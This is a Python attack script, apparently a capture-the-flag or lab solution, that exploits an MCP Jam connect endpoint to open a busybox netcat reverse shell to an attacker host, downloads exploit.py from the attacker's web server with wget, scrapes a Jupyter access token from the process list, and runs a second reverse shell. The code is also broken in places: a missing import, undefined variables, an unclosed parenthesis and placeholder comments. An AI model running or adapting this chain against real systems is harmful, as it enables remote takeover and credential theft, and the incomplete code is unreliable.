import requests
import subprocess
import argparse
import websocket
import http.server
import time 

# So this thing will proceed in 3 phases
# 1. mcp_jam control via the curl request and netcat control
# 2. a python webserver will be transferring the expoit.py file and then 
# 3, The netcat at 4444 will initiate a command which will connect another nect cat to the shell of the analyser user at port 3333 
#    using the jupiter notebook

def start_http_server():
    server= subprocess.Popen(
        ['python3','-m', 'http.server']
    )
    print("[+] HTTP server running at port 8000")
def initalise_netcat_server_listener(port):
    nc_process = subprocess.Popen(
    ["nc", "-lvnp", f'{port}' ],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    text=True
    )
    return nc_process


def mcp_jam_connect(target_host,attacker_host):
    mcp_jam_port= 6274
    url= f'http://{target_host}:6274/api/mcp/connect'
    payload = {
    "serverConfig": {
        "command": "busybox",
        "args": [
            "nc",
            f"{attacker_host}",
            f"4444",
                "-e",
                "/bin/bash"
            ],
            "env": {}
        },
        "serverId": "213j1l3jkljkl3j"
    }
    response = requests.post(url, json=payload, verify=False)

def get_next_shell(target_host,attacker_host):
    # init the netcat servers
    nc1 = initalise_netcat_server_listener(4444)
    nc2 = initalise_netcat_server_listener(3333)
    start_http_server()
    print("[+] Listener Started at  4444 and 3333")
    mcp_jam_connect(target_host=target_host,attacker_host=attacker_host)
    print('[+] Requset send connected to the netcat server at 4444')
    # finding access token
    nc1.stdin.write("ps aux | grep 'token'")
    # taking the ot put and parsing the token
    # -----
    print(f'[+] jupiter token parserd {token}')
    print('[+] Sending explit.py')
    nc1.stdin.write(f'wget http://{attacker_host}:8000/exploit.py')
    #wait for some time in order to download thte file 
    # -----

    match = re.search(r'--ServerApp\.token=([^\s]+)', cmdline)
    if match:
        token = match.group(1
        print('[+] Running exploit.py on the host to connect to netcat 3333')
        nc1.stdin.write(f"python3 exploit.py -H localhosst -p 8888 -c 'nc {attacker_host} 3333 -e /bin/bash' -t {token}")
        #Then provide the net cat shell to ineract with the nc2
    else:
        print('Token not found')



if __name__=='__main__':
    parser= argparse.ArgumentParser()
    
    # target host
    # target port 
    # attacker host

    parser.add_argument('-th',help="target host" )
    parser.add_argument('-ah' ,help="attacker host")
    args=parser.parse_args()

    get_next_shell(target_host= args.th, attacker_host= args.ah)